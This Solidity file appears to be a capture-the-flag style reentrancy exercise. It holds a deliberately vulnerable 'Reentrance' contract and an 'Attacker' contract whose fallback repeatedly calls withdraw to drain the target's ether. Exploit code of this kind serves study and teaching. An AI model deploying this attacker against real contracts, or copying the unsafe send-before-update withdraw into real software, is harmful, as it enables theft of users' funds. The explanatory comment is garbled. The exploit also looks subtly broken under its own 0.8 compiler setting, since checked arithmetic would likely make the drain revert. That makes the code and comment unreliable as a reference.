// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// The following contract could be attacked using a reentrancy attack. The attack is performed by creating a malicious contract with
// a fallback function. The attack is possible, because the withdraw function first updates transfers the amount to the caller
// using msg.sender.call method, which is dangerous.
contract Reentrance {
    mapping(address => uint) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to] + msg.value;
    }

    function balanceOf(address _who) public view returns (uint balance) {
        return balances[_who];
    }

    function withdraw(uint _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result, ) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}

contract Attacker {
    Reentrance public reentrance;

    constructor(address reentranceAddress) public {
        reentrance = Reentrance(payable(reentranceAddress));
    }

    function attack() public payable {
        reentrance.donate{value: 0.001 ether}(address(this));
        reentrance.withdraw(0.001 ether);
    }

    fallback() external payable {
        if (address(reentrance).balance > 0) {
            reentrance.withdraw(0.001 ether);
        }
    }
}
